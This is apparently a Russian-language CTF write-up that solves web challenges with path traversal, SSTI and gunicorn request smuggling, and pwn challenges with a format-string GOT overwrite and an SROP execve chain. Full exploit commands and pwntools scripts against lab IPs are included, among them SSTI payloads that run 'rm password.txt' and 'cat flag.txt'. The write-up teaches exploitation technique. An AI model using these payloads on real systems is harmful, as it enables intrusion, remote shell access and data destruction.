# Task-Based
## Web
### Web1
Заходим на сайт видим подсвеченный номер-ссылку одной из ячеек календаря.
Переходим видим hint_1 понимаем, что это уязвимость Path Traversal.
Добавляем после равно в url хинта ../../etc/secret выгружаем файл на наш компьютер, получаем флаг.
### Web2
Находим ssti в /doc/ и пример эксплуатации: https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability.
Изначально в директории /login перед чтением пароля из файла password.txt переменной adminPassword присваивается значение по умолчанию: password.
Значит, c помощью ssti в /doc можно удалить password.txt, а затем в /login с помощью get-параметра password передать значение по умолчанию.
Exploit:
```bash
sudo apt install httpie
http get http://192.168.12.13:8090/doc/__%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22rm%20password.txt%22%29%7D__%3A%3A.xRY
http get http://192.168.12.13:8090/login?password=password  
```
### Web3
Изучив содержимое Dockerfile'а замечаем, что версия gunicorn уязвима к http request smuggling 
https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/
Значит, мы можем отправить запрос на директорию flag (на которую мы изначально зайти не можем из-за запрета в конфиге haproxy), в которой есть уязвимость ssti с обходом списка запретов. Нам подходит такой payload: {self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()}}.
Exploit:
```bash
echo -en "GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 161\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /flag?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()}} HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc 192.168.12.11 8001
```
## Pwn
### Pwn1
Заметим, что в бинарном файле происходит выполнение функции printf с контролируемым пользователем первым аргументом. В таких случаях можно применить уязвимость format string, позволяющую перезаписывать информацию по произвольному адресу. В данном случае отключены защиты, отвечающие за запрет перезаписи GOT и рандомизации адресов (адреса функций в бинарном файле статичны и их можно переписывать).
В данном случае можно переписать в GOT адрес функции exit на адрес функции win, тем самым запустив system("/bin/sh").
Exploit:
``` python
from pwn import *

context.arch = "amd64"
main_addr = 0x40116c
exit_got = 0x404018
printf_got = 0x404008
fgets_got = 0x404010
system_addr = 0x404000
offset = 6

def leak_offset():
    for i in range(1,20):
        p = process("/home/kali/Downloads/main")
        p.sendline(b"A" * 8 + f"%{i}$llx".encode().ljust(8,b"|") + b"A" * 8)
        print(i,p.recvline())
        p.close()

p = connect("192.168.12.13",1923)
 
payload = fmtstr_payload(offset,{exit_got:0x401156}) # exit got to win_func
print(payload)
p.sendline(payload)
p.interactive()
```
### Pwn2
Открыв бинарный файл, замечаем, что при запуске программы запускается только один syscall на read() по адресу rsp с размером буфера 500. Также сразу после вызова syscall'а и окончания бинарного файла лежат инструкции ассемблера pop rax; ret, которые можно использовать для построения ROP-цепочки. В данном случае применяется техника SROP, которая позволяет поменять нужные нам регистры и переписать адрес rdi на адрес строки "/bin/sh\x00", которую при запуске с помощью echo -ne "/bin/sh\x00" засовывают в бинарный файл. Так как адреса в данном бинаре статичные, и у нас есть все нужные компоненты для применения техники SROP, мы можем вызвать syscall execve("/bin/sh"), тем самым получив удаленный доступ.
Exploit:
```python
from pwn import *

context.arch = "amd64"
p = connect("192.168.12.13", 1555)

BINSH = 0x41430
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()

```
## Rev
### Rev1



## Crypto
### Crypto1


## Forensics
### Первая машина (Windows)



### Вторая машина (Debian)

